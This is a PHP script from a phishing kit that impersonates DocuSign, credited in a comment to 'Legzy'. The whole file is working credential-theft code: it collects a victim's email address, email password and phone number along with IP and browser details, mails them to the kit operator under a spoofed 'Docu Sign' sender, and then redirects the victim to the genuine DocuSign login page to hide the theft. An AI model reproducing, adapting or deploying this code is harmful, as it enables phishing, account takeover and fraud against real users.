<?
/*
Created by legzy : icq 692561824
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
require "CONTROLS.php";

$email = $_SESSION['email'];
$emailpass = $_POST['emailpass'];
$tel = $_POST['tel'];

if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$send = $Your_Email;
$subj = "Rezult | $ip";
$from = "From: Docu Sign <jameswills2001@outlook.com";
$msg = "\n+--------------+ Legzy Docu Sign +-----------------------+\nEmail Address : $email\nEmail Password : $emailpass\nPhone Number : $tel\n+----------------------------------------------------------+\nUser IP : $ip\n$date\nAgent : $useragent\n+---------------+ Created BY Legzy +-------------+ \n\n";


{
mail($send,$subj,$msg,$from);

}
header("Location: https://www.docusign.net/Member/authenticate.aspx");
?>